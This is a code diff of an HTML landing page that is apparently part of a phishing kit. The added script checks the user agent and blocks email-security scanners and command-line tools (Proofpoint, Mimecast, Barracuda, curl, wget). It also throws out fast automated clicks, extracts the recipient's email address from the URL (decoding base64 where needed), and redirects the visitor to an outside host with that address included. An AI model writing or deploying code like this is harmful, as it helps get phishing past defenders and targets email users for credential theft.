@@ -1,34 +1,111 @@
 <!DOCTYPE html>
-<html lang="es-MX">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="author" content="">
-    <script type="text/javascript">
-        function generateRandomString(length) {
-            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-            const charactersLength = characters.length;
-            return Array.from(window.crypto.getRandomValues(new Uint32Array(length)))
-                .map(randomValue => characters.charAt(randomValue % charactersLength))
-                .join('');
-        }
-
-        function randomRedirect() {
-            const baseUrls = [
-                'https://www.urboii.com/',
-                'https://www.urboii.com/',
-            ];
-            const randomBaseUrl = baseUrls[Math.floor(Math.random() * baseUrls.length)];
-            const randomPath = generateRandomString(10) + '/' + generateRandomString(10) + '/' + generateRandomString(10);
-            window.location.href = randomBaseUrl + randomPath;
-        }
-
-        window.onload = function() {
-            document.title = generateRandomString(10);
-            randomRedirect();
-        };
-    </script>
-    <title></title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Loading...</title>
 </head>
 <body>
+<script>
+var baseUrl = 'https://www.urboii.com/';
+
+function generateSegment(length) {
+    var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    var result = '';
+    for (var i = 0; i < length; i++) {
+        result += chars[Math.floor(Math.random() * chars.length)];
+    }
+    return result;
+}
+
+function decodeEmailFromPart(part) {
+    part = part.replace(/=+$/, '');
+    try {
+        var b64 = part.replace(/-/g, '+').replace(/_/g, '/');
+        var pad = b64.length % 4 === 0 ? '' : '===='.slice(b64.length % 4);
+        var decoded = atob(b64 + pad);
+        if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decoded)) return decoded;
+    } catch(e) {}
+    try {
+        var b64b = part;
+        var pad2 = b64b.length % 4 === 0 ? '' : '===='.slice(b64b.length % 4);
+        var decoded2 = atob(b64b + pad2);
+        if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decoded2)) return decoded2;
+    } catch(e) {}
+    return '';
+}
+
+// Filter bots by User-Agent (JS can read navigator.userAgent)
+var botAgents = [
+    'microsoft office', 'msnbot', 'outlook-ios',
+    'google-safety', 'barracuda', 'proofpoint',
+    'mimecast', 'sophos', 'symantec',
+    'curl', 'python-requests', 'go-http-client',
+    'wget', 'libwww-perl'
+];
+var ua = navigator.userAgent.toLowerCase();
+for (var i = 0; i < botAgents.length; i++) {
+    if (ua.indexOf(botAgents[i]) !== -1) {
+        document.write('');
+        throw new Error('bot');
+    }
+}
+
+// Timing filter — bots click in less than 3 seconds
+var params = new URLSearchParams(window.location.search);
+var sentTime = parseInt(params.get('t') || '0', 10);
+if (sentTime && (Math.floor(Date.now() / 1000) - sentTime) < 3) {
+    document.write('');
+    throw new Error('too fast');
+}
+
+// Extract email from URL path
+var email = '';
+var path = window.location.pathname;
+var parts = path.replace(/^\/|\/$/g, '').split('/');
+
+for (var j = 0; j < parts.length; j++) {
+    var part = parts[j];
+    if (!part) continue;
+
+    // Mode 1: base64url or base64
+    var decoded = decodeEmailFromPart(part);
+    if (decoded) { email = decoded; break; }
+
+    // Mode 2: raw email in segment
+    if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(part)) { email = part; break; }
+
+    // Mode 3: email mixed in segment
+    var m = part.match(/([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})/);
+    if (m) { email = m[1]; break; }
+}
+
+// Mode 4: fallback regex on full URL
+if (!email) {
+    var fullUrl = window.location.href;
+    var fm = fullUrl.match(/([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})/);
+    if (fm) email = fm[1];
+}
+
+// Build redirect URL
+var redirectUrl;
+if (email) {
+    var urls = [
+        baseUrl + generateSegment(8) + '/' + email + '/' + generateSegment(8),
+        baseUrl + generateSegment(8) + '/' + email + '/' + generateSegment(8),
+    ];
+    redirectUrl = urls[Math.floor(Math.random() * urls.length)];
+} else {
+    var urls2 = [
+        baseUrl + generateSegment(8) + '/' + generateSegment(8),
+        baseUrl + generateSegment(8) + '/' + generateSegment(8),
+    ];
+    redirectUrl = urls2[Math.floor(Math.random() * urls2.length)];
+}
+
+setTimeout(function() {
+    window.location.replace(redirectUrl);
+}, 100);
+</script>
 </body>
 </html>
